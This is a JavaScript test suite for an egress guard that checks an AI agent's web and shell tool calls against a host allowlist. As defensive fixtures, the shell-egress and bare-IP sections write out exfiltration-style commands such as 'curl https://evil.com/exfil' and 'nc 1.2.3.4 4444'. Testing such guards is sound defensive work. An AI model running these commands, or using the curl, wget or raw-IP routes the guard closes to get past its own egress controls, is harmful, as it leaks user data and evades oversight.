import { test } from "node:test";
import assert from "node:assert/strict";
import {
  extractUrl,
  hostFromUrl,
  hostMatches,
  checkCall,
  extractHostsFromCommand,
} from "../src/egress-guard.js";

test("extractUrl reads url / uri / endpoint", () => {
  assert.equal(extractUrl({ args: { url: "https://a.com" } }), "https://a.com");
  assert.equal(extractUrl({ args: { uri: "https://b.com" } }), "https://b.com");
  assert.equal(extractUrl({ args: { endpoint: "https://c.com" } }), "https://c.com");
  assert.equal(extractUrl({ args: {} }), "");
});

test("hostFromUrl parses host, tolerates scheme-less and bad input", () => {
  assert.equal(hostFromUrl("https://API.GitHub.com/repos"), "api.github.com");
  assert.equal(hostFromUrl("api.github.com/x"), "api.github.com");
  assert.equal(hostFromUrl("not a url at all !!"), "");
  assert.equal(hostFromUrl(""), "");
  assert.equal(hostFromUrl(null), "");
});

test("hostMatches handles exact, dot-suffix, glob, wildcard", () => {
  assert.ok(hostMatches("api.github.com", "api.github.com"));
  assert.ok(!hostMatches("evil.com", "api.github.com"));
  assert.ok(hostMatches("api.github.com", ".github.com"));
  assert.ok(hostMatches("github.com", ".github.com"));
  assert.ok(!hostMatches("notgithub.com", ".github.com"));
  assert.ok(hostMatches("api.openai.com", "*.openai.com"));
  assert.ok(!hostMatches("api.openai.com.evil.com", "*.openai.com"));
  assert.ok(hostMatches("anything.example", "*"));
});

test("checkCall is inert without egress config or for non-http calls", () => {
  assert.equal(checkCall({ tool: "WebFetch", args: { url: "https://x.com" } }).blocked, false);
  const egress = { allow: ["a.com"] };
  assert.equal(checkCall({ tool: "Bash", args: { command: "ls" } }, egress).blocked, false);
});

test("checkCall blocks a non-allowlisted host", () => {
  const egress = { allow: ["api.github.com"] };
  const r = checkCall({ tool: "WebFetch", args: { url: "https://evil.com/x" } }, egress);
  assert.ok(r.blocked);
  assert.equal(r.action, "deny");
  assert.equal(r.host, "evil.com");
});

test("checkCall allows an allowlisted host", () => {
  const egress = { allow: ["*.github.com"] };
  const r = checkCall({ tool: "http", args: { url: "https://api.github.com" } }, egress);
  assert.equal(r.blocked, false);
});

test("checkCall honors action: ask", () => {
  const egress = { allow: ["a.com"], action: "ask" };
  const r = checkCall({ tool: "WebFetch", args: { url: "https://b.com" } }, egress);
  assert.ok(r.blocked);
  assert.equal(r.action, "ask");
});

test("checkCall blocks an http call with an unresolvable host", () => {
  const egress = { allow: ["a.com"] };
  const r = checkCall({ tool: "WebFetch", args: { url: "garbage ::: not a url" } }, egress);
  assert.ok(r.blocked);
  assert.equal(r.host, "");
});

// ---- shell egress: curl/wget/nc must not bypass the allowlist --------------

test("extractHostsFromCommand finds explicit URLs and bare network-tool hosts", () => {
  assert.deepEqual(extractHostsFromCommand("curl https://evil.com/exfil"), [
    "evil.com",
  ]);
  assert.deepEqual(extractHostsFromCommand("wget http://Bad.Example.COM/x"), [
    "bad.example.com",
  ]);
  assert.deepEqual(extractHostsFromCommand("nc evil.com 4444"), ["evil.com"]);
  assert.deepEqual(extractHostsFromCommand("scp file user@host.example.org:/tmp"), [
    "host.example.org",
  ]);
  // A local command with no destination yields nothing.
  assert.deepEqual(extractHostsFromCommand("ls -la /tmp"), []);
});

test("checkCall: shell curl to a non-allowlisted host is denied (allowlist bypass fixed)", () => {
  const egress = { allow: ["api.github.com"] };
  const r = checkCall(
    { tool: "Bash", args: { command: "curl https://evil.com/exfil" } },
    egress
  );
  assert.ok(r.blocked, "curl to evil.com must be blocked under an allowlist");
  assert.equal(r.action, "deny");
  assert.equal(r.host, "evil.com");
});

test("checkCall: shell curl to an allowlisted host is allowed", () => {
  const egress = { allow: ["api.github.com"] };
  const r = checkCall(
    { tool: "Bash", args: { command: "curl https://api.github.com/repos" } },
    egress
  );
  assert.equal(r.blocked, false);
});

test("checkCall: a local shell command (no network host) is not blocked", () => {
  const egress = { allow: ["api.github.com"] };
  const r = checkCall({ tool: "Bash", args: { command: "ls -la /tmp" } }, egress);
  assert.equal(r.blocked, false);
});

test("checkCall: shell egress honors action: ask", () => {
  const egress = { allow: ["api.github.com"], action: "ask" };
  const r = checkCall(
    { tool: "Bash", args: { command: "wget http://other.example.com/x" } },
    egress
  );
  assert.ok(r.blocked);
  assert.equal(r.action, "ask");
});

// ---- bare IP literals must not bypass the allowlist ------------------------

test("extractHostsFromCommand recognizes bare IPv4 and bracketed IPv6", () => {
  assert.deepEqual(extractHostsFromCommand("curl 1.2.3.4"), ["1.2.3.4"]);
  assert.deepEqual(extractHostsFromCommand("nc 1.2.3.4 443"), ["1.2.3.4"]);
  assert.deepEqual(extractHostsFromCommand("curl 10.0.0.5/admin"), ["10.0.0.5"]);
  assert.deepEqual(extractHostsFromCommand("curl [2001:db8::1]:8080/x"), [
    "[2001:db8::1]",
  ]);
});

test("checkCall: bare-IP curl to a non-allowlisted IP is denied", () => {
  const egress = { allow: ["api.github.com"] };
  const r = checkCall({ tool: "Bash", args: { command: "curl 1.2.3.4" } }, egress);
  assert.ok(r.blocked, "curl to a raw IP must be blocked under an allowlist");
  assert.equal(r.action, "deny");
  assert.equal(r.host, "1.2.3.4");
});

test("checkCall: bare-IP nc exfil to a non-allowlisted IP is denied", () => {
  const egress = { allow: ["10.0.0.1"], action: "ask" };
  const r = checkCall(
    { tool: "Bash", args: { command: "nc 1.2.3.4 4444" } },
    egress
  );
  assert.ok(r.blocked);
  assert.equal(r.action, "ask");
  assert.equal(r.host, "1.2.3.4");
});

test("checkCall: an allowlisted bare IP is allowed through", () => {
  const egress = { allow: ["1.2.3.4"] };
  const r = checkCall({ tool: "Bash", args: { command: "curl 1.2.3.4/x" } }, egress);
  assert.equal(r.blocked, false);
});
